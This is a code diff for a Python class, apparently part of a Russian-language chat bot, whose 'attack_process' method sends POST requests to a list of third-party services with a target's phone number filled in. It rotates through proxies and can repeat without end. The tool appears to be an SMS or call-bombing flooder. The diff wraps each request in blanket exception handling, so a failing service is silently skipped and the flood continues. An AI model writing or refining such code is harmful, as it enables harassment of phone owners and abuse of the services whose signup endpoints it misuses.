@@ -67,10 +67,6 @@ class Phone:
             except ClientHttpProxyError:
                 await message.answer(text="Техническая ошибка!")
                 break
-            except TypeError:
-                pass
-            except Exception as e:
-                pass
 
     async def attack_process(self, message: Message, is_proxy=False):
         proxy = self.proxy_format(choice(self.load_proxies()))
@@ -79,20 +75,25 @@ class Phone:
         else:
             proxy_auth = None
         for k,v in self.services.items():
-            if not v["formating"]:
-                if "data" in v:
-                    data = (v["data"] % self.phone[-10:]).replace("'", "\"")
-                    await self.session.post(url=k, data=loads(data),
-                        headers=self.headers, timeout=3,
+            try:
+                if not v["formating"]:
+                    if "data" in v:
+                        data = (v["data"] % self.phone[-10:]).replace("'", "\"")
+                        await self.session.post(url=k, data=loads(data),
+                            headers=self.headers, timeout=3,
+                            proxy=proxy["url"], proxy_auth=proxy_auth)
+                    elif "json" in v:
+                        json = (v["json"] % self.phone[-10:]).replace("'", "\"")
+                        await self.session.post(url=k, json=loads(json),
+                            headers=self.headers, timeout=3,
+                            proxy=proxy["url"], proxy_auth=proxy_auth)
+                else:
+                    await self.session.post(url=k % self.phone, timeout=3,
                         proxy=proxy["url"], proxy_auth=proxy_auth)
-                elif "json" in v:
-                    json = (v["json"] % self.phone[-10:]).replace("'", "\"")
-                    await self.session.post(url=k, json=loads(json),
-                        headers=self.headers, timeout=3,
-                        proxy=proxy["url"], proxy_auth=proxy_auth)
-            else:
-                await self.session.post(url=k % self.phone, timeout=3,
-                    proxy=proxy["url"], proxy_auth=proxy_auth)
+            except TypeError:
+                pass
+            except Exception as e:
+                pass
 
         if self.count_circles!="∞":
             self.count_circles = int(self.count_circles) - 1
